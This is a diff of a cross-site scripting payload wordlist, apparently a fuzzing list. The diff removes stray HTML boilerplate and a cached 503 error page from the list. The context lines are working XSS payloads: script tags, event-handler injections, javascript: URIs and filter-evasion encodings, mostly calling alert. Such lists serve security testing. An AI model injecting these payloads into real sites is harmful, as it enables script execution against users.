@@ -54,7 +54,6 @@
 "`'><script>\xEF\xBF\xAEjavascript:alert(1)</script>
 "`'><script>\xEF\xBF\xBEjavascript:alert(1)</script>
 "`'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 %0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(test)//'">`
 '">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">
 '"`><script>/* *\x2Fjavascript:alert(1)// */</script>
@@ -82,21 +81,16 @@
 <!--[if<img src=x onerror=javascript:alert(1)//]> -->
 <!--[if]><script>javascript:alert(1)</script -->
 <!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
 <![><img src="]><img src=x onerror=javascript:alert(1)//">
 <% foo><x foo="%><script>javascript:alert(1)</script>">
 </ foo="><script>javascript:alert(1)</script>">
 <// style=x:expression\28javascript:alert(1)\29>
-</body>
-</head>
-</html>
 </script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
 </script><script>alert(1);</script>
 <<SCRIPT>%(payload)s//<</SCRIPT>
 <<SCRIPT>alert("XSS");//\<</SCRIPT>
 <? foo="><script>javascript:alert(1)</script>">
 <? foo="><x foo='?><script>javascript:alert(1)</script>'>">
-<?xml version="1.0" encoding="utf-8"?>
 <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>
 <A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
 <A HREF="http://0102.0146.0007.00000223/">XSS</A>
@@ -315,7 +309,6 @@
 <body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
 <body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
 <body src=1 href=1 onerror="javascript:alert(1)"></body>
-<body>
 <comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
 <data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
 <div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
@@ -346,11 +339,7 @@
 <frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
 <frameset onload=javascript:alert(1)>
 <frameset onload=javascript:javascript:alert(1)></frameset>
-<h1>Error 503 first byte timeout</h1>
-<h3>Error 54113</h3>
-<head>
 <head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">XXX</a></body>
-<hr>
 <html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
 <html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
 <html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
@@ -361,7 +350,6 @@
 <html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
 <html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
 <html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
-<html>
 <iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
 <iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
 <iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
@@ -439,9 +427,6 @@
 <object onError object onError="javascript:javascript:alert(1)"></object onError>
 <object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
 <object src=1 href=1 onerror="javascript:alert(1)"></object>
-<p>Details: cache-iad-kcgs7200171-IAD 1694220829 2971360334</p>
-<p>Varnish cache server</p>
-<p>first byte timeout</p>
 <script charset="\x22>javascript:alert(1)</script>
 <script language='javascript' src='%(jscript)s'></script>
 <script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
@@ -509,7 +494,6 @@
 <table background="javascript:javascript:alert(1)">
 <title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
 <title onpropertychange=javascript:alert(1)></title><title title=>
-<title>503 first byte timeout</title>
 <video onerror="javascript:javascript:alert(1)"><source>
 <video poster=javascript:javascript:alert(1)//
 <video src=1 href=1 onerror="javascript:alert(1)"></video>
